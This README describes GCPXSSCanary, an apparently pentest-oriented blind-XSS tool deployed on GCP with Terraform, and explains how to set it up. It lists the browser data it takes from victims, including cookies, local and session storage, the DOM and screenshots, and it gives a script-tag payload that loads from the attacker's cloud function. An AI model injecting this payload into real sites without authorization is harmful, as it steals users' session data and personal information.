# GCPXSSCanary

GCPXSSCanary is a tool that can be used to collect blind-xss victim browser details, stored in GCP, and notified in a communication channel such as Slack or Google Chat. This tool was written to slightly improve on other similar tools, such as SleepyPuppy, xless, BeEF, and others by providing a terraform build process for serverless generation as well as securely storing screenshots within cloud storage, rather than a public image host. 

For additional details, refer to the [accompanying White Oak Security blog post](https://www.whiteoaksecurity.com/blog/blind-xss-gcp-functions-gcpxsscanary/).

## Collection Data Points

- URL
- User-Agent
- HTTP Referrer
- Origin
- Document Location
- Browser DOM
- Browser Time
- Cookies (Without HTTPOnly)
- LocalStorage
- SessionStorage
- IP Address
- Screenshot
- Browser Unique Fingerprint

## Deployment

First, create two secrets within GCP for your slack tokens. These should have the values of:

`<GCP Project Name>-slack-channel`

and 

`<GCP Project Name>-slack-secret`

Next, modify the main.tf file to contain your GCP project name and then initialize, plan, and deploy the terraform project. 

`terraform init`

`terraform plan`

`terraform apply`

## Usage

A successful deployment will generate a URL within GCP for collection. Several collection methods exist within the JavaScript to enable/disable features such as screenshot collection etc. Standard usage is to include the / endpoint as part of a script or eval.

`<script src='<Cloud Function URL>'/>`

Once a victim executes this payload, the collection methods will fire and be sent back to the cloud function for storage and notification. View the data within slack.
